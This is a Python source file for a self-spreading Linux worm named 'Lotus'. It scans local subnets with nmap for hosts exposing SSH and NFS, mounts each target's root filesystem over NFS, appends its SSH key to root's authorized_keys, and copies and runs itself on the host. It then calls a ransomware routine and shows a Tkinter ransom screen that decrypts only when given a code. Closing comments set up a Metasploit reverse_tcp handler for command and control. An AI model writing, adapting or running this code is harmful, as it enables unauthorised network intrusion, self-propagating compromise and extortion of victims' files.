#! /usr/bin/env python3
import os
import nmap
import subprocess
from subprocess import Popen, PIPE
import base64
from os import path
import encryptor
from tkinter import *
import tkinter.messagebox
import time
#ssh_command = "/Lotus/worm.py; exit"                               ## Add command and control server info here, as well as running the worm itself.
#cron = "* * * * * /Lotus/Lotus.py \n"
def gui():
    def update(ind):

        frame = frames[ind]
        ind += 1
        if ind == frameCnt:
            ind = 0
        label2 = Label(frame1, image=frame, bg="black")
        label2.place(x=0, y=0)

        root.after(60, update, ind)

    def decrypter():
        dir1 = "important"
        inputvariable = entry.get()
        print(inputvariable)

        subprocess.run([
                           'gpg --pinentry-mode=loopback --passphrase ' + inputvariable + ' --output /' + dir1 + '.tar.gz --decrypt /' + dir1 + '.tar.gz.gpg'],
                       shell=True)
        if os.path.isfile('/' + dir1 + '.tar.gz'):
            subprocess.run(['cd / ; tar xzf ' + dir1 + '.tar.gz'], shell=True)

            if os.path.isdir('/' + dir1):
                tkinter.messagebox.showinfo("Success!!!", "Files Decrypted")
                subprocess.run(['rm /' + dir1 + '.tar.gz.gpg'], shell=True)
                subprocess.run(['rm /' + dir1 + '.tar.gz'], shell=True)

        else:
            tkinter.messagebox.showinfo("Warning!!!", "File Not Decrypted")

    root = Tk()

    #cwd = os.getcwd()

    frameCnt = 49
    frames = [PhotoImage(file= '/Lotus/x3.gif', format='gif -index %i' % (i)) for i in range(frameCnt)]

    frame1 = Frame(root, height=550, width=1000, bg='black')
    frame1.pack()

    entry = Entry(root, text="INPUT CODE", bd=5, fg="black", bg="white", width=40)
    entry.place(x=325, y=410, height=30)

    button = Button(root, text="VALIDATE CODE", padx=10, pady=10, fg="red", bg="black", command=decrypter)
    button.place(x=505, y=450)

    button = Button(root, text="UNLOCK LINK", padx=10, pady=10, fg="red", bg="black")
    button.place(x=370, y=450)

    update(0)
    root.mainloop()

def subnet():                                                                     #This runs first
    global h_ip                                                                   #Set a global variable to contain the host machine ip for use in check 3
    process = subprocess.Popen(['ifconfig'], stdout=subprocess.PIPE)              #Run ifconfig on the host machine
    stdout = process.communicate()[0]                                             #Read stdout from ifconfig
    stdout = str(stdout.strip())                                                  #Strip stdout and cast to s string
    stdout = stdout.split(' ')                                                    #Split stdout into a list at the '.'
    stdout = [i for i in stdout if i]                                             #Remove blank entries using list comprehension
    elem_list = []                                                                #Initialize a list for storing element numbers
    t = -1                                                                       #Starting element for loop to be increased each time to iterate through an entire list
    while True:
        try:                                                                      #A try loop allows us to iterate through a list to the end then stop execution at the end of the list without an error
            t = stdout.index('inet', t + 1)                                       #The index of the element after the string 'inet' is added to elem_list
            elem_list.append(t + 1)
        except ValueError:                                                        #When the end of the list is reached a ValueError is thrown ending the loop
            break
    newelem_list = []                                                             #A new list is created to hold the elements named in elem_list
    for i in elem_list:                                                           #Create a loop to loop over the elements in elem_list as i
        newelem_list.append(stdout[i])                                            #The elements stored in 'stdout' at the index 'i' are added to 'newelem_list'
    newelem_list.remove('127.0.0.1')                                              #127.0.0.1 is removed from the results
    h_ip = newelem_list
    f_list = []                                                                   #The final list is created to hold the final ip's in Cider notation
    for i in newelem_list:                                                        #A for loop is created to transform the contents of 'newelem_list' into Cider notation
        o = i.split('.')                                                          #The ip stored in i is split into 4 elements at the '.' and stored in a list named 'o'
        o.pop()                                                                   #The last element is removed
        f_list.append(str(o[0] + '.' + o[1] + '.' + o[2] + '.' + '1' + '/24'))   #The ip is reconstructed into Cider notation and appended to 'f_list'
    return(f_list)                                                                #f_list is returned

def ssh():
    ssh_list = []
    print('Subnet detection complete, starting scan . . .')                                                                   #A list is created to contain valid ip's to exploit
    for ip_range in subnet():                                                       #The subnets returned from the subnet function are iterated over                                                             #Define a list to contain ip's open on port 22
        nm = nmap.PortScanner()                                                     #Instantiate portscanner object
        nm.scan(ip_range, '22, 111, 2049')                                                         #Scan ports 10.0.2.0 - 10.0.2.256
        for host in nm.all_hosts():                                                 #Create a for loop to iterate over the list of scanned hosts
            if nm[host]['tcp'][22]['state'] == 'open' and nm[host]['tcp'][111]['state'] == 'open' and nm[host]['tcp'][2049]['state'] == 'open':                              #Validate port 22 is open on 'host'
                ssh_list.append(host)                                               #Add validated hosts to ssh_list
    print('Scan Complete!')
    return(ssh_list)                                                                #Return the contents of ssh_list

def check2():                                                                      #A check to determine if our worm is already installed on a target
    target_list = []                                                                #Create a list to hold valid target ip's without our worm installed
    for ip in ssh():                                                             #Iterate over the ip's returned from the 'ssh' function
        if ip not in h_ip:
            os.makedirs('/tmp/r00t', exist_ok = True)                                   #Create directory '/tmp/r00t' if not already there
            subprocess.run(['mount -t nfs ' + str(ip) +  ':/ /tmp/r00t/'], shell=True)         #Exploit smb to mount target root directory to '/tmp/r00t'
            if path.exists('/tmp/r00t/Lotus') != True:                                  #if our worm is not found in '/tmp/r000t/':
                target_list.append(ip)                                                  #The ip is added to target_list
    if len(target_list) == 0:
        print('No Valid Targets!')
    else:
        print('Target(s) validated:' + str(target_list))
        return(target_list)                                                             #target_list is returned

def worm():

    for ip in check2():
        print(ip)
        os.system('mkdir /Lotus')  # makes directory to copy worm to machine
        os.system('cp ./* /Lotus')  # worm is copied to directory
        os.system('{ echo -ne "\n" ; echo -ne "y" ; echo -ne "\n"; } | ssh-keygen')  # key pair exploit
        os.system('mkdir /tmp/r00t')  # key pair exploit
        os.system('mount -t nfs ' + str(ip) + ':/ /tmp/r00t/')  # key pair exploit
        os.system('cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys')  # key pair exploit
        os.system('umount /tmp/r00t')  # key pair exploit
        os.system('scp -r /Lotus root@' + str(ip) + ':/')  # copies worm to new machine
        os.system('ssh root@' + str(ip))  # opens ssh shell, probably not needed
        os.system('ssh root@' + str(ip) + ' "/Lotus/worm.py"')

        # # for ip in check2():
        # #     print('Starting Worm . . .')
        #     os.makedirs('/tmp/r00t', exist_ok = True)
        #     subprocess.run(['mount -t nfs ' + str(ip) + ':/ /tmp/r00t/'], shell=True)
        #     subprocess.call(['cp', '-r', '/Lotus', '/tmp/r00t'])
        #     print('Copying complete, attempting ssh')
        #     subprocess.run(['ssh-keyscan ' + str(ip) + '>> ~/.ssh/known_hosts'], shell=True)
        #     proc = subprocess.Popen(['ssh-keygen -t rsa -f ~/.ssh/id_rsa'],stdout=PIPE, stdin=PIPE, shell=True)
        #     proc.communicate(input=base64.encodebytes('y'.encode()))
        #     proc.communicate()
        #     subprocess.call(['cat ~/.ssh/id_rsa.pub >> /tmp/r00t/root/.ssh/authorized_keys'], shell=True)
        #     subprocess.run(['umount /tmp/r00t'], shell=True)
        #     os.system('ssh root@' + str(ip) + ' "/Lotus/worm.py"')
        #     #subprocess.run(['ssh', '-t', 'root@'  + str(ip), ssh_command])
        #     #subprocess.run(['ssh root@'  + str(ip)] + ' /Lotus/worm.py', shell=True)
        #     print('Complete! running program')


def check1():
    if path.exists('/Lotus') == True:
        print('Root Path Found')
        worm()
    elif path.exists('/Lotus') == False:
        print('Root file not found, creating . . .')
        cwd = os.getcwd()
        subprocess.run(['cp', '-r', cwd, '/Lotus'])
        worm()



def main():
    check1()
    encryptor.ransom()
    gui()


if __name__ == '__main__':
    main()




## TO RUN METASPLOIT HANDLER, ENSURE CORRECT IP IS SET IN "ssh_command" VARIABLE
#msfconsole
#use /exploit/multi/handler
#set payload linux/x86/shell/reverse_tcp
#set LHOST
#set LPORT
#run